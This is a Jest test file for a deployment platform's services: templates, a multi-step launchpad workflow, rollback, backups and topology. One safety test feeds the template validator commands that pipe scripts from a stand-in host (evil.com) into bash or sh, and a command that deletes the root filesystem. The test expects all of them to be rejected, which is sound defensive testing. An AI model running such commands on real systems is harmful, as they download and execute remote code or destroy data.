'use strict';
process.env.NODE_ENV = 'test';
process.env.DATABASE_PATH = ':memory:';
process.env.SESSION_SECRET = 'test-secret';
process.env.JWT_SECRET = 'test-jwt-secret';

const fs = require('fs');
const { initDatabase, runMigrations, closeDatabase, getDb } = require('../../database/database');
const {
  listTemplates,
  getTemplateByKey,
  validateTemplateSafety,
  previewTemplateApplication,
  createTemplate
} = require('../../src/services/templateService');
const {
  createWorkflow,
  getWorkflowById,
  updateWorkflowStep,
  executeLaunchpadWorkflow,
  resumeWorkflow,
  listWorkflows
} = require('../../src/services/launchpadService');
const {
  createApplication,
  getApplicationById,
  triggerApplicationDeploy,
  rollbackApplication,
  getApplicationDeployments,
  getDeploymentById
} = require('../../src/services/applicationService');
const {
  createDatabaseBackup,
  verifyBackupIntegrity,
  testRestoreBackup
} = require('../../src/services/backupService');
const {
  getInfrastructureTopology,
  getSystemOverview
} = require('../../src/services/monitoringService');
const {
  retryWebhookDelivery
} = require('../../src/services/webhookService');

let createdBackupPath = null;

beforeAll(() => {
  initDatabase();
  runMigrations();
  getDb().prepare("INSERT INTO users(tg_id, username, role) VALUES(2001, 'launchpad_tester', 'admin')").run();

  // Seed a domain for subdomain and Launchpad tests
  getDb().prepare(`
    INSERT INTO custom_domains (tg_id, domain, verification_token, verified, active, dns_provider, dns_status)
    VALUES (2001, 'commandor.my.id', 'token-cf-123', 1, 1, 'manual', 'propagated')
  `).run();
});

afterAll(() => {
  if (createdBackupPath && fs.existsSync(createdBackupPath)) {
    try { fs.unlinkSync(createdBackupPath); } catch {}
  }
  closeDatabase();
});

describe('Subdomain Templates & Safety Enforcement', () => {
  test('listTemplates returns seeded official templates', () => {
    const templates = listTemplates();
    expect(templates.length).toBeGreaterThanOrEqual(5);

    const keys = templates.map(t => t.template_key);
    expect(keys).toContain('nodejs-express');
    expect(keys).toContain('fastapi-python');
    expect(keys).toContain('vitepress-docs');
    expect(keys).toContain('static-landing');
    expect(keys).toContain('status-page');
  });

  test('validateTemplateSafety rejects dangerous shell commands in build/start scripts', () => {
    // Dangerous command patterns
    expect(() => validateTemplateSafety({
      name: 'Malicious Template',
      recommended_build: 'npm install && curl http://evil.com/payload.sh | bash',
      recommended_start: 'npm start'
    })).toThrow(/disallowed command or pattern/i);

    expect(() => validateTemplateSafety({
      name: 'RCE Template',
      recommended_build: 'rm -rf / --no-preserve-root',
      recommended_start: 'npm start'
    })).toThrow(/disallowed command or pattern/i);

    expect(() => validateTemplateSafety({
      name: 'Wget Pipe Sh Template',
      recommended_build: 'npm run build',
      recommended_start: 'wget http://evil.com/x.sh | sh'
    })).toThrow(/disallowed command or pattern/i);

    // Safe commands must pass
    const safeResult = validateTemplateSafety({
      name: 'Safe Node App',
      recommended_build: 'npm ci && npm run build',
      recommended_start: 'npm start'
    });
    expect(safeResult).toBe(true);
  });

  test('previewTemplateApplication generates proxy and detects conflicts', () => {
    const preview = previewTemplateApplication({
      templateKey: 'nodejs-express',
      subdomain: 'api-preview',
      baseDomain: 'commandor.my.id',
      targetPort: 8080
    });

    expect(preview.target.fullDomain).toBe('api-preview.commandor.my.id');
    expect(preview.target.port).toBe(8080);
    expect(preview.renderedConfig).toContain('proxy_pass http://upstream_api_preview_commandor_my_id;');
    expect(preview.hasConflict).toBe(false);
    expect(preview.preservedRecordsNotice).toBeDefined();
  });
});

describe('Commandor Launchpad 10-Step Workflow Lifecycle', () => {
  let workflowId;

  test('creates a new Launchpad workflow starting at step 1', () => {
    const wf = createWorkflow({
      tgId: 2001,
      name: 'Launchpad API Service',
      serviceType: 'application',
      templateKey: 'nodejs-express'
    });
    expect(wf).toBeDefined();
    expect(wf.current_step).toBe(1);
    expect(wf.status).toBe('draft');
    expect(wf.name).toBe('Launchpad API Service');
    expect(wf.workflow_data.step3_runtime.runtime).toBe('nodejs');
    workflowId = wf.id;
  });

  test('updates steps sequentially and compiles preview', async () => {
    // Step 1: Source
    const s1 = await updateWorkflowStep(workflowId, 1, {
      git_repo: 'https://github.com/Masrofii/sample-node-service.git',
      git_branch: 'main',
      type: 'git'
    }, 2001);
    expect(s1.current_step).toBe(2);
    expect(s1.workflow_data.step1_source.git_repo).toBe('https://github.com/Masrofii/sample-node-service.git');

    // Step 2: Node
    const s2 = await updateWorkflowStep(workflowId, 2, {
      node_id: null,
      node_name: 'Local Host Node'
    }, 2001);
    expect(s2.current_step).toBe(3);

    // Step 3: Runtime & Build
    const s3 = await updateWorkflowStep(workflowId, 3, {
      runtime: 'nodejs',
      build_command: 'npm ci && npm run build',
      start_command: 'npm start',
      port: 5050,
      health_check_path: '/health'
    }, 2001);
    expect(s3.current_step).toBe(4);
    expect(s3.workflow_data.step3_runtime.port).toBe(5050);

    // Step 4: Secrets
    const s4 = await updateWorkflowStep(workflowId, 4, {
      env_vars: {
        APP_ENV: 'staging',
        SECRET_TOKEN: 'super-confidential-token-1234'
      }
    }, 2001);
    expect(s4.current_step).toBe(5);

    // Step 5: Domain & Subdomain
    const s5 = await updateWorkflowStep(workflowId, 5, {
      subdomain: 'launchpad-service',
      base_domain: 'commandor.my.id',
      enable_https: false
    }, 2001);
    expect(s5.current_step).toBe(6);
    expect(s5.workflow_data.step5_domain.subdomain).toBe('launchpad-service');

    // Step 6: Preview DNS and Proxy changes
    const s6 = await updateWorkflowStep(workflowId, 6, {}, 2001);
    expect(s6.current_step).toBe(7);
    expect(s6.workflow_data.step6_preview).toBeDefined();

    // Step 7: Confirm
    const s7 = await updateWorkflowStep(workflowId, 7, { confirmed: true }, 2001);
    expect(s7.current_step).toBe(8);
  });

  test('executes workflow (steps 8-10) with application provisioning and health check', async () => {
    const executed = await executeLaunchpadWorkflow(workflowId, 2001);
    expect(executed).toBeDefined();
    expect(executed.logs).toBeDefined();
    expect(executed.logs.length).toBeGreaterThan(0);
    expect(executed.application_id).toBeDefined();
    expect(executed.subdomain_id).toBeDefined();

    // Verify application created in database
    const app = getApplicationById(executed.application_id);
    expect(app.name).toBe('launchpad-api-service');
    expect(app.port).toBe(5050);

    // Verify recovery guidance is provided if health check is down
    if (executed.status === 'failed') {
      expect(executed.remediation).toBeDefined();
      expect(executed.workflow_data.step10_recovery.can_resume).toBe(true);
    }
  });

  test('resumeWorkflow recovers a failed or incomplete workflow', async () => {
    // Resume the workflow; it re-executes without re-creating subdomain
    const resumed = await resumeWorkflow(workflowId, 2001);
    expect(resumed).toBeDefined();
    expect(resumed.application_id).toBeDefined();
  });
});

describe('Deployment History, Safe Rollback & Health Verification', () => {
  let testAppId;
  let firstDeployId;
  let secondDeployId;

  beforeAll(() => {
    const app = createApplication({
      name: 'versioned-service',
      description: 'Test versioning and rollback',
      gitRepo: 'https://github.com/Masrofii/versioned-service.git',
      gitBranch: 'main',
      port: 6060,
      envVars: { KEY: 'val1' },
      userTgId: 2001
    });
    testAppId = app.id;
  });

  test('getApplicationDeployments lists releases with commit hashes and health records', async () => {
    const d1 = await triggerApplicationDeploy(testAppId, 2001);
    firstDeployId = d1.deploymentId;

    const d2 = await triggerApplicationDeploy(testAppId, 2001);
    secondDeployId = d2.deploymentId;

    const history = getApplicationDeployments(testAppId);
    expect(history.length).toBeGreaterThanOrEqual(2);
    expect(history[0].id).toBe(secondDeployId); // Newest first
    expect(history[1].id).toBe(firstDeployId);

    const single = getDeploymentById(firstDeployId);
    expect(single).toBeDefined();
    expect(single.id).toBe(firstDeployId);
    expect(single.commit_hash).toBe(d1.commitHash);
  });

  test('rollbackApplication restores prior deployment and executes real health verification', async () => {
    const rollbackRes = await rollbackApplication(testAppId, firstDeployId, 2001);
    expect(rollbackRes.success).toBe(true);
    expect(rollbackRes.deploymentId).toBeDefined();
    expect(rollbackRes.healthResult).toBeDefined();
    expect(typeof rollbackRes.healthy).toBe('boolean');

    // History now contains a rollback deployment entry
    const history = getApplicationDeployments(testAppId);
    const latest = history[0];
    expect(latest.is_rollback).toBe(1);
    expect(latest.rollback_from_id).toBe(firstDeployId);
  });
});

describe('Backup Integrity Check & Dry-Run Sandbox Restore', () => {
  let backupId;

  beforeAll(async () => {
    const backup = await createDatabaseBackup('Integrity test backup', 2001);
    backupId = backup.id;
    createdBackupPath = backup.file_path;
  });

  test('verifyBackupIntegrity computes SHA-256 and verifies SQLite header', async () => {
    const result = await verifyBackupIntegrity(backupId);
    expect(result.valid).toBe(true);
    expect(result.backupId).toBe(backupId);
    expect(result.fileSizeBytes).toBeGreaterThan(0);
    expect(result.checksum).toBeDefined();
    expect(result.checksum.length).toBe(64);
    expect(result.sqliteCheck.valid).toBe(true);
  });

  test('testRestoreBackup executes dry-run restore into isolated sandbox', async () => {
    const restoreTest = await testRestoreBackup(backupId, 2001);
    expect(restoreTest.success).toBe(true);
    expect(restoreTest.backupId).toBe(backupId);
    expect(restoreTest.tablesCount).toBeGreaterThan(0);
    expect(restoreTest.tables).toContain('users');
    expect(restoreTest.tables).toContain('custom_domains');
    expect(restoreTest.tables).toContain('service_templates');
  });
});

describe('Infrastructure Topology & Webhook Retries', () => {
  test('getInfrastructureTopology compiles complete relationship map', () => {
    const topology = getInfrastructureTopology();
    expect(topology).toBeDefined();
    expect(topology.nodes).toBeDefined();
    expect(Array.isArray(topology.nodes)).toBe(true);
    expect(topology.edges).toBeDefined();
    expect(Array.isArray(topology.edges)).toBe(true);
    expect(topology.summary).toBeDefined();

    const types = topology.nodes.map(n => n.type);
    expect(types).toContain('dns_provider');
    expect(types).toContain('domain');
    expect(types).toContain('application');

    // Health statuses must be valid states
    const allowedStatuses = ['healthy', 'degraded', 'unhealthy', 'unknown'];
    topology.nodes.forEach(node => {
      expect(allowedStatuses).toContain(node.healthState || node.status);
    });
  });

  test('retryWebhookDelivery rejects non-existent delivery gracefully', async () => {
    await expect(retryWebhookDelivery(99999)).rejects.toThrow(/Webhook delivery.*not found/i);
  });
});
